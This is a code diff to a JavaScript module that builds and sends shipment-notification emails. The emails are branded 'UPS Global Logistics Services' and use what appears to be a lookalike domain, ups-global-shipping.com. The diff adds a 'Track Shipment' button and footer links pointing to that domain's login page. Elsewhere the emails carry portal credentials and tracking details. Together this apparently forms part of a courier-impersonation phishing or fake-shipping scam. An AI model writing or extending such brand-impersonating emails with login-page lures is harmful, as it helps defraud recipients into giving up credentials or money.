@@ -54,13 +54,20 @@ function buildHtmlEmail({ recipientName, title, message, trackingNumber, status,
         </div>
         ` : ''}
 
+        <!-- Track Shipment Button -->
+        <div style="margin-top: 24px; text-align: center;">
+          <a href="https://www.ups-global-shipping.com/#login" style="display: inline-block; background-color: #351C15; color: #ffffff; font-weight: 700; font-size: 15px; padding: 12px 28px; border-radius: 4px; text-decoration: none; letter-spacing: 0.5px;">
+            Track Shipment &rarr;
+          </a>
+        </div>
+
       </div>
 
       <!-- Contact Footer Card 2 -->
       <div style="background-color: #ffffff; border-radius: 4px; padding: 24px; border: 1px solid #e2e8f0; font-size: 13px; color: #4a5568; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
         <p style="margin: 0 0 6px 0; font-weight: 700; color: #2d3748; font-size: 14px;">UPS Global Logistics Services</p>
         <p style="margin: 0 0 4px 0;">Official Transactional Notification</p>
-        <p style="margin: 0 0 4px 0;">Website: ups-global-shipping.com</p>
+        <p style="margin: 0 0 4px 0;">Website: <a href="https://www.ups-global-shipping.com/#login" style="color: #3182ce; text-decoration: underline;">ups-global-shipping.com</a></p>
         <p style="margin: 0; color: #718096;">Email: support@ups-global-shipping.com</p>
       </div>
 
@@ -104,7 +111,7 @@ export async function sendEmail({ to, recipientName, subject, messageBody, templ
     credentials: credentials
   });
 
-  const textContent = `Dear ${recipientName || 'Sir/Madam'},\n\n${messageBody}\n\n${credentials ? `CUSTOMER PORTAL CREDENTIALS:\nUsername: ${credentials.email}\nPassword: ${credentials.password}\n\n` : ''}${trackingCode ? `SHIPMENT DETAILS:\nTracking Code: ${trackingCode}\nStatus: ${status || 'IN TRANSIT'}\nRoute: ${origin || 'N/A'} -> ${destination || 'N/A'}\n` : ''}\nUPS Global Logistics Services\nWebsite: ups-global-shipping.com\nEmail: support@ups-global-shipping.com`;
+  const textContent = `Dear ${recipientName || 'Sir/Madam'},\n\n${messageBody}\n\n${credentials ? `CUSTOMER PORTAL CREDENTIALS:\nUsername: ${credentials.email}\nPassword: ${credentials.password}\n\n` : ''}${trackingCode ? `SHIPMENT DETAILS:\nTracking Code: ${trackingCode}\nStatus: ${status || 'IN TRANSIT'}\nRoute: ${origin || 'N/A'} -> ${destination || 'N/A'}\n` : ''}\nTrack Shipment: https://www.ups-global-shipping.com/#login\n\nUPS Global Logistics Services\nWebsite: https://www.ups-global-shipping.com/#login\nEmail: support@ups-global-shipping.com`;
 
   try {
     const resend = new Resend(apiKey);
